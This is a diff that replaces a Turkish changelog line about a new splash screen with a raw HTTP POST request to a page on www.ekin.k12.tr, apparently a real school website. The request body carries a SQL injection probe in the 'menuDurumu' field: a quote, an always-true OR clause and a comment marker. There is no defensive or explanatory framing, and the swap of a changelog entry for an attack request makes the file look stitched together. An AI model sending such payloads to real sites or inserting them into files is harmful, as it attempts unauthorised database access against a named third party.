@@ -1,1 +1,13 @@
-Yeni açılma ekranı getirildi. (Splash Screen)
+POST /basarilarimiz.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://www.ekin.k12.tr/
+Cookie: _fbp=fb.2.1636806140724.1017687150
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate,br
+Content-Length: 79
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
+Host: www.ekin.k12.tr
+Connection: Keep-alive
+
+menuDurumu=-1'%20OR%203*2*1=6%20AND%20000746=000746%20--%20&sit_mnFE0BBC45_vs=1
